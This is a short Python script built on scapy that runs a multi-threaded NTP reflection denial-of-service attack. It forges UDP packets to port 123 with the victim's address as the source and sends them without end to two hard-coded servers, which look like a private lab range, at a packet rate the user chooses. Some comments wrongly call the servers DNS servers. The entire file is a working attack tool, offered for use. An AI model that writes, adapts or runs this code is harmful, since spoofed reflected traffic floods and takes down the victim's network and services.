from scapy.all import *

import sys

import socket

import time

import threading

class NTPAttackFlow (threading.Thread) :

	"""
		default packet per second
		@var {Integer}
	"""
	DEFAULT_PACKET_PER_SECOND = 100

	"""
		init attack flow
		@param {List} dns_servers_ip
		@param {String} victime_ip
		@param {Integer} packet_per_second default 100
	"""
	def __init__ (self, server_ip, victime_ip, packet_per_second=100) :

		threading.Thread.__init__(self)

		#dns server ip
		self.server_ip = server_ip

		#victime server ip
		self.victime_ip = victime_ip

		#udp socket
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

		#attack rate in packet per second
		self.packet_per_second = packet_per_second

		#time between two packets
		self.attack_rate = 1 / self.packet_per_second

	"""
		run the thread
		@return {Void}
	"""
	def run (self) :

		self.start_attack()

	"""
		start the attack
		@return {Void}
	"""
	def start_attack (self) :

		print(f'{self.name} has started')

		while True :

			packet = IP(dst=self.server_ip, src=self.victime_ip) / UDP(dport=123,sport=50000) / NTPHeader("\x1b\x00\x00\x00"+"\x00"*11*4)

			self.sock.sendto(raw(packet), (self.server_ip, 123))

			time.sleep(self.attack_rate)

"""
	start muti threaded attack
	@return {Void}
"""
def start_attack () :

	victime_ip = sys.argv[1]

	packet_per_second = int(sys.argv[2]) if len(sys.argv) >= 3 else NTPAttackFlow.DEFAULT_PACKET_PER_SECOND

	servers = ['10.0.0.3', '10.0.0.4']

	threads = []

	for server in servers :

		thread = NTPAttackFlow(server, victime_ip, packet_per_second)

		threads.append(thread)

	for thread in threads :

		thread.start()

if __name__ == '__main__' :

	start_attack()